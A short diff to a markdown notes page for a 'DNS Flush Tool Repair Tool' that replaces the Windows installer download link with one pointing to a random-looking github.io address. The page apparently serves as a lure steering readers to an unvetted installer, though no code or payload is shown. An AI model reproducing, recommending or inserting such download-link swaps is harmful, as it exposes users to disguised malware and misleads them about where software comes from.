@@ -1,6 +1,6 @@
 # DNS Flush Tool Repair Tool Notes
 
-**Download:** [Get Windows installer →](https://dns-flush-tool.kolmods.com/)
+**Download:** [Get Windows installer →](https://undiminished-vestibularsystem91.github.io)
 
 ## Download & Install
 
